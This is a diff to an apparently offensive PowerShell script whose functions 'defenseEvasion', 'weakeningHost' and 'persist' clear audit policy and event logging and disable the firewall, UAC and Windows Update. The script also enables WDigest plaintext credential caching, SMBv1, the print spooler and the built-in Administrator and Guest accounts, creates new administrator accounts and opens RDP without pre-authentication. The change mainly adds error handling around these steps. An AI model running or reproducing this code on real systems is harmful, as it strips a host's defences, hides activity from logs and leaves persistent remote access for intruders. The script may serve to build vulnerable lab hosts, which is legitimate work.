@@ -6,11 +6,11 @@
 $arg0=$args[0]
 $arg1=$args[1]
 
-# This string will contain notes of every information performed by the script.
-# The log will only be written to the configs.txt file if the --log flag is set.
+# Define global variables
 $global:logString = ""
- $outFilePath = "./configs.txt"
+$outFilePath = "./configs.txt"
 $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+
 function defenseEvasion {
 
    $global:logString = $global:logString + "---------- DEFENSE EVASTION ----------`n"
@@ -24,17 +24,32 @@ function defenseEvasion {
         $global:logString = $global:logString +  "ERROR: Unable to stop Windows Event logging `n"
     }
 
-    auditpol.exe /clear /y
-    auditpol.exe  /remove /allusers
-    $global:logString = $global:logString +  "Audit policy logging disabled.`n"
+    try {
+        auditpol.exe /clear /y
+        auditpol.exe  /remove /allusers
+        $global:logString = $global:logString +  "Audit policy logging disabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to stop Audit policy logging. `n"
+    }
 
     #Disable Firewall Logging for all Firewall profiles
-    Set-NetFirewallProfile -Profile Domain,Public,Private -LogBlocked False -LogAllowed False -LogIgnored False
-    $global:logString = $global:logString +  "Firewall logging disabled.`n"
+    try {
+        Set-NetFirewallProfile -Profile Domain,Public,Private -LogBlocked False -LogAllowed False -LogIgnored False -ErrorAction Stop
+        $global:logString = $global:logString +  "Firewall logging disabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to stop Firewall logging. `n"
+    }
 
     # Disable all Firewall profiles
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-    $global:logString = $global:logString +  "Windows Firewall disabled. `n"
+    try {
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
+        $global:logString = $global:logString +  "Windows Firewall disabled. `n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to stop Windows Firewall. `n"
+    }
 
 }
 
@@ -42,36 +57,77 @@ function weakeningHost {
     $global:logString = $global:logString +  "---------- WEAKENING ---------- `n"
 
     #Set PowerShell policy to run any scripts from the internet (Unrestricted)
-    Set-ExecutionPolicy Unrestricted
-    $global:logString = $global:logString +  "PowerShell Exeuction Policy set to Unrestricted.1`n"
+    try {
+        Set-ExecutionPolicy Unrestricted -ErrorAction Stop
+        $global:logString = $global:logString +  "PowerShell Exeuction Policy set to Unrestricted.1`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to change PowerShell execution policy to Unrestricted. `n"
+    }
 
     #Disable UAC. Source https://github.com/nitroz3us/disable-windows-defender/blob/main/disable-windows-defender.ps1
-    New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
-    $global:logString = $global:logString +  "UAC disabled.`n"
+    try {
+        New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force -ErrorAction Stop
+        $global:logString = $global:logString +  "UAC disabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to disable UAC. `n"
+    }
 
     #Enable the default local users
-    Get-LocalUser -Name "Administrator" | Enable-LocalUser
-    $global:logString = $global:logString +  "Local Administrator user account enabled.`n"
-    Get-LocalUser -Name "Guest" | Enable-LocalUser
-    $global:logString = $global:logString +  "Local Guest user account enabled.`n"
+    try {
+        Get-LocalUser -Name "Administrator" | Enable-LocalUser -ErrorAction Stop
+        $global:logString = $global:logString +  "Local Administrator user account enabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to enable Local Administrator account. `n"
+    } 
+    
+    try {
+        Get-LocalUser -Name "Guest" | Enable-LocalUser -ErrorAction Stop
+        $global:logString = $global:logString +  "Local Guest user account enabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to enable Local Guest account. `n"
+    }
 
     #Enable Wdigest for plain-text credential caching. Source https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/
-    Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
-    $global:logString = $global:logString +  "Wdigesst enabled.`n"
+    try {
+        Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Stop
+        $global:logString = $global:logString +  "Wdigest enabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to enable Wdigest. `n"
+    }
 
     #Enable SMBv1
-    Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
-    $global:logString = $global:logString +  "SMBv1 enabled.`n"
+    try {
+        Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -ErrorAction Stop
+        $global:logString = $global:logString +  "SMBv1 enabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to enable SMBv1 `n"
+    }
 
     #Enable Print Spooler
-    Start-Service -Name spooler
-    Set-Service -Name spooler -StartupType 'Automatic'
-    $global:logString = $global:logString +  "Print spooler started, enabled on startup.`n"
+    try {
+        Start-Service -Name spooler -ErrorAction Stop
+        Set-Service -Name spooler -StartupType 'Automatic' -ErrorAction Stop
+        $global:logString = $global:logString +  "Print spooler started, enabled on startup.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to enable PrintSpooler `n"
+    }
 
     #Disable Windows Updates
-    Set-Service wuauserv -Startup Disabled
-    Stop-Service wuauserv -Force
-    $global:logString = $global:logString +  "Windows Updates disabled.`n"
+    try {
+        Set-Service wuauserv -Startup Disabled -ErrorAction Stop
+        Stop-Service wuauserv -Force -ErrorAction Stop
+        $global:logString = $global:logString +  "Windows Updates disabled.`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to disabled Windows updates. `n"
+    }
 
 }
 
@@ -100,36 +156,66 @@ function persist {
     $global:logString = $global:logString + "---------- PERSISTENCE ----------`n"
 
     #Gather credentials to create a non-privileged local account
-    $localUserName  = Read-Host -MaskInput "Enter the local (non-privileged) username: "
-    $localPass = Read-Host -AsSecureString "Enter the local (non-privileged) password: "
-    New-LocalUser -Name $localUserName -Password $localPass
-    $global:logString = $global:logString + "Local (non-privileged) user added: " + $localUserName + "`n"
+    try {
+        $localUserName  = Read-Host  "Enter the local (non-privileged) username: "
+        $localPass = Read-Host -AsSecureString "Enter the local (non-privileged) password: "
+        New-LocalUser -Name $localUserName -Password $localPass -ErrorAction Stop
+        $global:logString = $global:logString + "Local (non-privileged) user added: " + $localUserName + "`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to add local (non-privileged) user.`n"
+    }
 
     #Gather credentials to create a privileged local account
-    $adminUserName = Read-Host -MaskInput "Enter the local privileged username: "
-    $adminPass = Read-Host -AsSecureString "Enter the local privileged password: "
-    New-LocalUser -Name $adminUserName -Password $adminPass
-    $global:logString = $global:logString + "Local (privileged) user added: " + $adminUserName + "`n"
+    try {
+        $adminUserName = Read-Host "Enter the local privileged username: " 
+        $adminPass = Read-Host -AsSecureString "Enter the local privileged password: " 
+        New-LocalUser -Name $adminUserName -Password $adminPass -ErrorAction Stop
+        $global:logString = $global:logString + "Local (privileged) user added: " + $adminUserName + "`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to add local (privileged) user. `n"
+    }
 
     # Add the privileged user to the local Administrators account
-    Add-LocalGroupMember -Group "Administrators" -Member $adminUserName
-    $global:logString = $global:logString + "Local (privileged) user added to Administrators group: " + $localUserName + "`n"
+    try {
+        Add-LocalGroupMember -Group "Administrators" -Member $adminUserName -ErrorAction Stop
+        $global:logString = $global:logString + "Local (privileged) user added to Administrators group: " + $localUserName + "`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to add local (privileged) user to Administrators group.`n"
+    }
 
     ## Add both new users to the RDP allowed group
-    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $localUserName
-    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $adminUserName
-    $global:logString = $global:logString +   "Local users added to RDP group:" +  $localUserName + "," +  $adminUserName + "`n"
+    try {
+        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $localUserName -ErrorAction Stop
+        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $adminUserName -ErrorAction Stop
+        $global:logString = $global:logString +   "Local users added to RDP group:" +  $localUserName + "," +  $adminUserName + "`n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to add new local users to RDP group.`n"
+    }
 
     # Install SSH client on the host
-   Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+    try {
+   Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop
     # Enable SSH service + modify the service to start automatically
    $global:logString = $global:logString +  "SSH client installed. `n"
+    }
+    catch {
+        $global:logString = $global:logString +  "ERROR: Unable to install SSH client.`n"
+    }
 
    #Enable RDP on the system
    # Registry keys taken from this Reddit thread: https://www.reddit.com/r/PowerShell/comments/8qbxn5/enabling_rdp/
-    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 #Value 0 means RDP is enabled
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 #Value 0 means RDP can be opened before authentication
+   try {
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -ErrorAction Stop 
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -ErrorAction Stop  #Value 0 means RDP can be opened before authentication
     $global:logString = $global:logString +  "RDP enabled.`n"
+   }
+   catch {
+    $global:logString = $global:logString +  "ERROR: Unable to enable RDP. `n"
+   }
 }
 
 
@@ -150,10 +236,12 @@ if ($arg0 -eq "--persist" -or $arg1 -eq "--persist" ) {
     persist
 }
 
-
+# Write Output logs
 try {
     if ($arg0 -eq "--log" -or $arg1 -eq "--log" ) {
-        Remove-Item $outFilePath
+        if (Test-Path -Path $outFilePath) {
+            Remove-Item $outFilePath
+        }
         Add-Content -Path $outFilePath -Value $global:logString
     } 
 }
